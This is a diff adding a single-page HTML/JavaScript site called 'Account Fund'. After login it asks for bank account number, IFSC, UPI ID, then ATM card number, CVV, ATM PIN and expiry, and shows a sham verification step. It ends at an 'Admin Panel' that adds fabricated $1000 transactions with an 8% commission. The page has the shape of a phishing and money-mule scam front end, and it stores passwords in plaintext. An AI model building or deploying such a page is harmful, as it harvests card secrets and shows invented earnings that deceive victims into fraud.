@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Account Fund - Dashboard</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #0a0e1a;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: #141b2b;
+            border-radius: 24px;
+            padding: 30px 25px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #2a3450;
+            position: relative;
+        }
+        /* ===== PAGES (show/hide) ===== */
+        .page {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        .page.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== HEADINGS ===== */
+        h1, h2, h3 {
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .headline {
+            font-size: 28px;
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .sub-headline {
+            text-align: center;
+            color: #8892b0;
+            font-size: 14px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #1f2a40;
+            padding-bottom: 15px;
+        }
+
+        /* ===== FORM ELEMENTS ===== */
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #b0b9d6;
+            margin-top: 16px;
+            margin-bottom: 5px;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0f1625;
+            border: 1px solid #26304a;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus, select:focus {
+            border-color: #f7971e;
+            box-shadow: 0 0 0 3px rgba(247, 151, 30, 0.15);
+        }
+        input::placeholder {
+            color: #4a5670;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 22px;
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #0a0e1a;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(247, 151, 30, 0.4);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #f7971e;
+            color: #f7971e;
+        }
+        .btn-outline:hover {
+            background: #f7971e;
+            color: #0a0e1a;
+        }
+        .btn-sm {
+            padding: 10px 18px;
+            width: auto;
+            display: inline-flex;
+            margin-top: 10px;
+        }
+
+        /* ===== PLAN CARDS ===== */
+        .plan-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 18px 0;
+        }
+        .plan-card {
+            background: #0f1625;
+            border: 2px solid #1f2a40;
+            border-radius: 16px;
+            padding: 18px 20px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .plan-card:hover {
+            border-color: #f7971e;
+            background: #181f32;
+        }
+        .plan-card.selected {
+            border-color: #ffd200;
+            background: #1f283f;
+            box-shadow: 0 0 20px rgba(247, 151, 30, 0.15);
+        }
+        .plan-card .plan-name {
+            font-weight: 600;
+            font-size: 17px;
+        }
+        .plan-card .plan-icon {
+            font-size: 28px;
+            color: #f7971e;
+        }
+        .plan-card .plan-badge {
+            background: #f7971e;
+            color: #0a0e1a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        /* ===== VERIFICATION BOX ===== */
+        .verify-code-box {
+            background: #0f1625;
+            border: 2px dashed #f7971e;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .verify-code-box .code {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: 6px;
+            color: #ffd200;
+            font-family: 'Courier New', monospace;
+        }
+        .code-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+        .code-actions .btn-sm {
+            margin: 0;
+        }
+
+        /* ===== SUCCESS PAGE ===== */
+        .success-icon {
+            font-size: 72px;
+            text-align: center;
+            color: #4ade80;
+            margin: 20px 0;
+        }
+        .success-text {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #4ade80;
+        }
+
+        /* ===== ADMIN / DASHBOARD CARDS ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin: 18px 0;
+        }
+        .stat-card {
+            background: #0f1625;
+            border-radius: 16px;
+            padding: 18px;
+            border-left: 4px solid #f7971e;
+        }
+        .stat-card .stat-label {
+            font-size: 12px;
+            color: #8892b0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-card .stat-value {
+            font-size: 26px;
+            font-weight: 700;
+            margin-top: 4px;
+            color: #ffd200;
+        }
+        .stat-card .stat-value.green {
+            color: #4ade80;
+        }
+
+        /* ===== TRANSACTION LIST ===== */
+        .tx-list {
+            margin-top: 16px;
+        }
+        .tx-item {
+            background: #0f1625;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-left: 3px solid #4ade80;
+        }
+        .tx-item .tx-amount {
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .tx-item .tx-amount.credit {
+            color: #4ade80;
+        }
+        .tx-item .tx-detail {
+            font-size: 13px;
+            color: #8892b0;
+        }
+
+        /* ===== BACK BUTTON ===== */
+        .back-link {
+            color: #8892b0;
+            cursor: pointer;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 12px;
+            transition: 0.3s;
+        }
+        .back-link:hover {
+            color: #ffd200;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container { padding: 18px 14px; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .headline { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="app">
+
+    <!-- ========================================================= -->
+    <!-- PAGE 1: LOGIN / REGISTER                                   -->
+    <!-- ========================================================= -->
+    <div class="page active" id="page-login">
+        <h1 class="headline">🔐 Account Fund</h1>
+        <p class="sub-headline">Login or Create your account</p>
+
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <label>📧 Email Address</label>
+            <input type="email" id="loginEmail" placeholder="your@email.com" required />
+
+            <label>🔑 Password</label>
+            <input type="password" id="loginPassword" placeholder="••••••••" required />
+
+            <button type="submit" class="btn"><i class="fas fa-sign-in-alt"></i> Login</button>
+        </form>
+
+        <div style="text-align:center; margin-top:18px; color:#8892b0; font-size:14px;">
+            Don't have an account?
+            <span onclick="showPage('page-register')" style="color:#f7971e; cursor:pointer; font-weight:600;">
+                Register
+            </span>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 2: REGISTER                                          -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-register">
+        <h1 class="headline">📝 Create Account</h1>
+        <p class="sub-headline">Fill in your details</p>
+
+        <form onsubmit="handleRegister(event)">
+            <label>👤 Full Name</label>
+            <input type="text" id="regName" placeholder="John Doe" required />
+
+            <label>📧 Email Address</label>
+            <input type="email" id="regEmail" placeholder="your@email.com" required />
+
+            <label>📱 Phone Number</label>
+            <input type="tel" id="regPhone" placeholder="+91 98765 43210" required />
+
+            <label>🔑 Password</label>
+            <input type="password" id="regPassword" placeholder="••••••••" required />
+
+            <button type="submit" class="btn"><i class="fas fa-user-plus"></i> Register</button>
+        </form>
+
+        <div style="text-align:center; margin-top:18px; color:#8892b0; font-size:14px;">
+            Already have an account?
+            <span onclick="showPage('page-login')" style="color:#f7971e; cursor:pointer; font-weight:600;">
+                Login
+            </span>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 3: DASHBOARD (Account Work)                          -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-dashboard">
+        <!-- HEADLINE: "Account Work" -->
+        <h1 class="headline">💼 Account Work</h1>
+        <p class="sub-headline">Welcome, <span id="dashUserName">User</span>! Select your account type</p>
+
+        <!-- Plan Selection -->
+        <div class="plan-grid" id="planGrid">
+            <div class="plan-card" data-plan="saving" onclick="selectPlan('saving')">
+                <div>
+                    <span class="plan-name">🏦 Saving Account</span>
+                    <div style="font-size:12px; color:#8892b0;">Best for daily use</div>
+                </div>
+                <span class="plan-badge">Popular</span>
+            </div>
+            <div class="plan-card" data-plan="current" onclick="selectPlan('current')">
+                <div>
+                    <span class="plan-name">💳 Current Account</span>
+                    <div style="font-size:12px; color:#8892b0;">For business & traders</div>
+                </div>
+                <span class="plan-icon">➡️</span>
+            </div>
+            <div class="plan-card" data-plan="corporate" onclick="selectPlan('corporate')">
+                <div>
+                    <span class="plan-name">🏢 Corporate Account</span>
+                    <div style="font-size:12px; color:#8892b0;">For companies & firms</div>
+                </div>
+                <span class="plan-icon">🏛️</span>
+            </div>
+        </div>
+
+        <button class="btn" id="continuePlanBtn" onclick="goToAccountDetails()" style="margin-top:10px;">
+            <i class="fas fa-arrow-right"></i> Continue with Selected Plan
+        </button>
+
+        <!-- Logout button -->
+        <button class="btn btn-outline" onclick="logout()" style="margin-top:12px;">
+            <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 4: ACCOUNT DETAILS                                   -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-account-details">
+        <span class="back-link" onclick="showPage('page-dashboard')"><i class="fas fa-arrow-left"></i> Back</span>
+        <h2 style="margin-bottom:6px;">📋 Account Details</h2>
+        <p style="color:#8892b0; font-size:14px; margin-bottom:18px;">Enter your <span id="selectedPlanName">Saving</span> account info</p>
+
+        <form onsubmit="saveAccountDetails(event)">
+            <label>🏦 Account Number</label>
+            <input type="text" id="accNumber" placeholder="1234567890" required />
+
+            <label>🏛️ IFSC Code</label>
+            <input type="text" id="ifscCode" placeholder="SBIN0001234" required />
+
+            <label>📱 UPI ID</label>
+            <input type="text" id="upiId" placeholder="you@upi" required />
+
+            <label>📞 Phone Number</label>
+            <input type="tel" id="accPhone" placeholder="+91 98765 43210" required />
+
+            <button type="submit" class="btn"><i class="fas fa-save"></i> Submit Account Details</button>
+        </form>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 5: BANK DETAILS (ATM)                               -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-bank-details">
+        <span class="back-link" onclick="showPage('page-account-details')"><i class="fas fa-arrow-left"></i> Back</span>
+        <h2 style="margin-bottom:6px;">💳 Bank Card Details</h2>
+        <p style="color:#8892b0; font-size:14px; margin-bottom:18px;">Enter your ATM / Debit card info</p>
+
+        <form onsubmit="saveBankDetails(event)">
+            <label>💳 ATM / Card Number</label>
+            <input type="text" id="atmNumber" placeholder="1234 5678 9012 3456" required />
+
+            <label>🔐 CVV</label>
+            <input type="password" id="cvv" placeholder="•••" maxlength="4" required />
+
+            <label>🔑 ATM PIN</label>
+            <input type="password" id="atmPin" placeholder="••••" maxlength="4" required />
+
+            <label>📅 Expiry Date</label>
+            <input type="month" id="expiryDate" required />
+
+            <button type="submit" class="btn"><i class="fas fa-credit-card"></i> Submit Bank Details</button>
+        </form>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 6: VERIFICATION CODE (Show)                         -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-verify-show">
+        <span class="back-link" onclick="showPage('page-bank-details')"><i class="fas fa-arrow-left"></i> Back</span>
+        <h2 style="margin-bottom:6px;">🔑 Verification Code</h2>
+        <p style="color:#8892b0; font-size:14px; margin-bottom:8px;">Use this code to verify your account</p>
+
+        <div class="verify-code-box">
+            <div class="code" id="verificationCodeDisplay">4829 7610</div>
+            <div class="code-actions">
+                <button class="btn btn-sm" onclick="copyCode()"><i class="fas fa-copy"></i> Copy</button>
+                <button class="btn btn-sm" onclick="showPage('page-verify-enter')"><i class="fas fa-check"></i> Submit & Verify</button>
+            </div>
+        </div>
+        <p style="color:#8892b0; font-size:12px; text-align:center;">This code is generated for your session.</p>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 7: ENTER VERIFICATION CODE                          -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-verify-enter">
+        <span class="back-link" onclick="showPage('page-verify-show')"><i class="fas fa-arrow-left"></i> Back</span>
+        <h2 style="margin-bottom:6px;">⌨️ Enter Verification Code</h2>
+        <p style="color:#8892b0; font-size:14px; margin-bottom:18px;">Paste the code you received</p>
+
+        <form onsubmit="verifyCode(event)">
+            <label>📝 Verification Code</label>
+            <input type="text" id="verifyCodeInput" placeholder="4829 7610" required />
+
+            <button type="submit" class="btn"><i class="fas fa-check-circle"></i> Verify</button>
+        </form>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 8: VERIFY SUCCESS                                   -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-verify-success">
+        <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+        <div class="success-text">✅ Verified Successfully!</div>
+        <p style="text-align:center; color:#8892b0; margin:10px 0 20px;">Your account has been activated.</p>
+        <button class="btn" onclick="showPage('page-admin-dashboard')">
+            <i class="fas fa-chart-line"></i> Go to Dashboard
+        </button>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 9: ADMIN DASHBOARD (Fake Transactions & Commission) -->
+    <!-- ========================================================= -->
+    <div class="page" id="page-admin-dashboard">
+        <h1 class="headline">📊 Admin Panel</h1>
+        <p class="sub-headline">Live Transaction & Commission Tracker</p>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-label">💰 Total Amount</div>
+                <div class="stat-value" id="totalAmount">$0.00</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">📈 Your Commission (8%)</div>
+                <div class="stat-value green" id="totalCommission">$0.00</div>
+            </div>
+        </div>
+
+        <!-- Fake Transaction List -->
+        <h3 style="margin-top:10px; font-size:16px; color:#b0b9d6;">
+            <i class="fas fa-history"></i> Recent Transactions
+        </h3>
+        <div class="tx-list" id="transactionList">
+            <div style="color:#4a5670; text-align:center; padding:20px; font-size:14px;">
+                No transactions yet. Add a fake transaction below.
+            </div>
+        </div>
+
+        <!-- Add Fake Transaction Button -->
+        <button class="btn" onclick="addFakeTransaction()" style="margin-top:16px;">
+            <i class="fas fa-plus-circle"></i> Add Fake Transaction (+$1000)
+        </button>
+
+        <!-- Reset / Logout -->
+        <button class="btn btn-outline" onclick="logout()" style="margin-top:12px;">
+            <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+    </div>
+
+</div>
+
+<!-- ========================================================= -->
+<!-- JAVASCRIPT - COMPLETE LOGIC                              -->
+<!-- ========================================================= -->
+<script>
+    // ==================== GLOBALS ====================
+    let currentUser = null;
+    let selectedPlan = null;
+    let generatedCode = '';
+    let transactions = [];
+    let totalAmount = 0;
+    let commissionRate = 0.08; // 8%
+
+    // ==================== PAGE NAVIGATION ====================
+    function showPage(pageId) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    // ==================== AUTH ====================
+    function handleLogin(e) {
+        e.preventDefault();
+        const email = document.getElementById('loginEmail').value.trim();
+        const pass = document.getElementById('loginPassword').value.trim();
+
+        // Check if user exists in localStorage
+        const users = JSON.parse(localStorage.getItem('users') || '[]');
+        const found = users.find(u => u.email === email && u.password === pass);
+
+        if (found) {
+            currentUser = found;
+            document.getElementById('dashUserName').textContent = found.name || 'User';
+            showPage('page-dashboard');
+            // Reset form
+            document.getElementById('loginForm').reset();
+        } else {
+            alert('❌ Invalid email or password. Please register first.');
+        }
+    }
+
+    function handleRegister(e) {
+        e.preventDefault();
+        const name = document.getElementById('regName').value.trim();
+        const email = document.getElementById('regEmail').value.trim();
+        const phone = document.getElementById('regPhone').value.trim();
+        const pass = document.getElementById('regPassword').value.trim();
+
+        if (!name || !email || !phone || !pass) {
+            alert('Please fill all fields.');
+            return;
+        }
+
+        let users = JSON.parse(localStorage.getItem('users') || '[]');
+        if (users.find(u => u.email === email)) {
+            alert('❌ Email already registered. Please login.');
+            return;
+        }
+
+        const newUser = { name, email, phone, password: pass };
+        users.push(newUser);
+        localStorage.setItem('users', JSON.stringify(users));
+
+        alert('✅ Registration successful! Please login.');
+        document.getElementById('page-register').querySelector('form').reset();
+        showPage('page-login');
+    }
+
+    function logout() {
+        currentUser = null;
+        selectedPlan = null;
+        showPage('page-login');
+        // Reset selections
+        document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
+    }
+
+    // ==================== PLAN SELECTION ====================
+    function selectPlan(plan) {
+        selectedPlan = plan;
+        document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
+        document.querySelector(`.plan-card[data-plan="${plan}"]`).classList.add('selected');
+    }
+
+    function goToAccountDetails() {
+        if (!selectedPlan) {
+            alert('⚠️ Please select an account plan first!');
+            return;
+        }
+        // Show plan name on next page
+        const planNames = { saving: 'Saving', current: 'Current', corporate: 'Corporate' };
+        document.getElementById('selectedPlanName').textContent = planNames[selectedPlan] || 'Selected';
+        showPage('page-account-details');
+    }
+
+    // ==================== ACCOUNT DETAILS ====================
+    function saveAccountDetails(e) {
+        e.preventDefault();
+        const accNum = document.getElementById('accNumber').value.trim();
+        const ifsc = document.getElementById('ifscCode').value.trim();
+        const upi = document.getElementById('upiId').value.trim();
+        const phone = document.getElementById('accPhone').value.trim();
+
+        if (!accNum || !ifsc || !upi || !phone) {
+            alert('Please fill all account details.');
+            return;
+        }
+
+        // Save in session
+        sessionStorage.setItem('accDetails', JSON.stringify({ accNum, ifsc, upi, phone }));
+        showPage('page-bank-details');
+    }
+
+    // ==================== BANK DETAILS ====================
+    function saveBankDetails(e) {
+        e.preventDefault();
+        const atm = document.getElementById('atmNumber').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        const pin = document.getElementById('atmPin').value.trim();
+        const expiry = document.getElementById('expiryDate').value;
+
+        if (!atm || !cvv || !pin || !expiry) {
+            alert('Please fill all bank card details.');
+            return;
+        }
+
+        // Save in session
+        sessionStorage.setItem('bankDetails', JSON.stringify({ atm, cvv, pin, expiry }));
+
+        // Generate Verification Code
+        generatedCode = Math.floor(10000000 + Math.random() * 90000000).toString();
+        // Format as XXXX XXXX
+        generatedCode = generatedCode.slice(0,4) + ' ' + generatedCode.slice(4,8);
+        document.getElementById('verificationCodeDisplay').textContent = generatedCode;
+
+        showPage('page-verify-show');
+    }
+
+    // ==================== VERIFICATION ====================
+    function copyCode() {
+        const code = document.getElementById('verificationCodeDisplay').textContent;
+        navigator.clipboard.writeText(code).then(() => {
+            alert('✅ Code copied to clipboard!');
+        }).catch(() => {
+            // Fallback
+            const range = document.createRange();
+            range.selectNode(document.getElementById('verificationCodeDisplay'));
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            alert('✅ Code copied!');
+        });
+    }
+
+    function verifyCode(e) {
+        e.preventDefault();
+        const entered = document.getElementById('verifyCodeInput').value.trim();
+        if (entered === generatedCode) {
+            showPage('page-verify-success');
+            // Add a default fake transaction on success
+            addFakeTransaction();
+        } else {
+            alert('❌ Invalid verification code. Please try again.');
+        }
+    }
+
+    // ==================== ADMIN DASHBOARD (Fake Transactions) ====================
+    function addFakeTransaction() {
+        const amount = 1000; // Fixed fake amount
+        const commission = amount * commissionRate;
+
+        totalAmount += amount;
+        const commissionTotal = totalAmount * commissionRate;
+
+        // Add to transactions list
+        transactions.push({
+            id: Date.now(),
+            amount: amount,
+            commission: commission,
+            date: new Date().toLocaleString(),
+            type: 'Credit'
+        });
+
+        updateDashboard();
+    }
+
+    function updateDashboard() {
+        // Update stats
+        document.getElementById('totalAmount').textContent = '$' + totalAmount.toFixed(2);
+        document.getElementById('totalCommission').textContent = '$' + (totalAmount * commissionRate).toFixed(2);
+
+        // Update transaction list
+        const list = document.getElementById('transactionList');
+        if (transactions.length === 0) {
+            list.innerHTML = `<div style="color:#4a5670; text-align:center; padding:20px; font-size:14px;">
+                No transactions yet. Add a fake transaction below.
+            </div>`;
+            return;
+        }
+
+        list.innerHTML = transactions.map(tx => `
+            <div class="tx-item">
+                <div>
+                    <div class="tx-amount credit">+$${tx.amount.toFixed(2)}</div>
+                    <div class="tx-detail">${tx.date}</div>
+                </div>
+                <div style="text-align:right;">
+                    <div style="color:#4ade80; font-weight:600;">Commission: $${tx.commission.toFixed(2)}</div>
+                    <div style="font-size:11px; color:#4a5670;">${tx.type}</div>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    // ==================== INIT ====================
+    // Auto-show login if no user logged in
+    if (!currentUser) {
+        showPage('page-login');
+    }
+
+    // Check if user already logged in via localStorage? We'll just show login.
+    // For demo, we don't auto-login.
+
+    console.log('✅ Account Fund Website Loaded!');
+    console.log('📌 Built with ❤️ for GitHub Pages');
+</script>
+
+</body>
+</html>
